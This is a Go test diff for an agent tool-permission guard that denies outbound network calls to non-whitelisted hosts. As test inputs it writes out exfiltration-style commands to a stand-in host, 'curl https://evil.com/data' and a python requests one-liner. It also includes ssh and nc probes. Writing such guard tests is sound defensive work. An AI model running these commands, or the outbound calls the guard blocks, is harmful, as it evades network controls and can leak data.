@@ -469,26 +469,43 @@ func TestExtractScanRequest_Variants(t *testing.T) {
 	require.NoError(t, err)
 }
 
-func TestCheckDomainInArgs_AllWhitelisted(t *testing.T) {
-	// checkDomainInArgs is called when a net tool (curl/wget/nc/ssh) is used
-	// without an explicit HTTP URL — e.g. "ssh github.com" or "nc github.com 443".
+func TestCheckNetworkOutbound_Unconditional(t *testing.T) {
 	guard := NewGuard()
 	ctx := context.Background()
 
-	// Whitelisted domain via ssh — should be allowed
-	req := createTestReq("workspace_exec", "ssh github.com")
+	// Recognized net tool with explicit URL — existing behavior
+	req := createTestReq("workspace_exec", "curl https://evil.com/data")
 	decision, err := guard.CheckToolPermission(ctx, req)
+	require.NoError(t, err)
+	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
+	assert.Equal(t, "RULE_NETWORK_NON_WHITELIST", guard.LastReport().RuleID)
+
+	// Recognized net tool with whitelisted URL — allowed
+	req = createTestReq("workspace_exec", "curl https://github.com/user/repo")
+	decision, err = guard.CheckToolPermission(ctx, req)
 	require.NoError(t, err)
 	assert.Equal(t, tool.PermissionActionAllow, decision.Action)
 
-	// Non-whitelisted domain via ssh — should be denied
-	req = createTestReq("workspace_exec", "ssh evil.com")
+	// Non-net-tool command with embedded URL — now checked unconditionally
+	req = createTestReq("workspace_exec", `python -c "import requests; requests.get('https://evil.com/data')"`)
 	decision, err = guard.CheckToolPermission(ctx, req)
 	require.NoError(t, err)
 	assert.Equal(t, tool.PermissionActionDeny, decision.Action)
 	assert.Equal(t, "RULE_NETWORK_NON_WHITELIST", guard.LastReport().RuleID)
 
-	// nc with no domain-like word — denied (no whitelisted domain found)
+	// Non-net-tool with whitelisted URL — allowed
+	req = createTestReq("workspace_exec", `python -c "import requests; requests.get('https://api.github.com/zen')"`)
+	decision, err = guard.CheckToolPermission(ctx, req)
+	require.NoError(t, err)
+	assert.Equal(t, tool.PermissionActionAllow, decision.Action)
+
+	// ssh without explicit URL falls back to domain-in-args check
+	req = createTestReq("workspace_exec", "ssh github.com")
+	decision, err = guard.CheckToolPermission(ctx, req)
+	require.NoError(t, err)
+	assert.Equal(t, tool.PermissionActionAllow, decision.Action)
+
+	// net tool with no URL and no domain — denied by domain-in-args fallback
 	req = createTestReq("workspace_exec", "nc -z 192.168.1.1 80")
 	decision, err = guard.CheckToolPermission(ctx, req)
 	require.NoError(t, err)
